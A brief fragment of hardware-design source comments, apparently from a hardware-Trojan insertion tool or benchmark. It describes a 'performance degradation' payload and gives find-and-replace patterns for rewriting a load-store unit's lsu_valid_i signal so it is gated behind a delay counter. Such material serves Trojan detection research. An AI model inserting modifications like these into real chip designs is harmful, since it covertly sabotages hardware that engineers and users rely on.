 ...
 * Payload: Delay lsu_valid_i by N cycles
 * 
...
// ============================================================
// Performance Degradation: Delay lsu_valid_i by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF lsu_valid_i is a ready/valid signal:
//   Find: assign lsu_valid_i = ready_condition;
//   Replace: assign lsu_valid_i = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF lsu_valid_i is in always_ff:
//   Find: lsu_valid_i <= ready_value;
//   Replace: lsu_valid_i <= (delay_counter == 0) ? ready_value : 1'b0;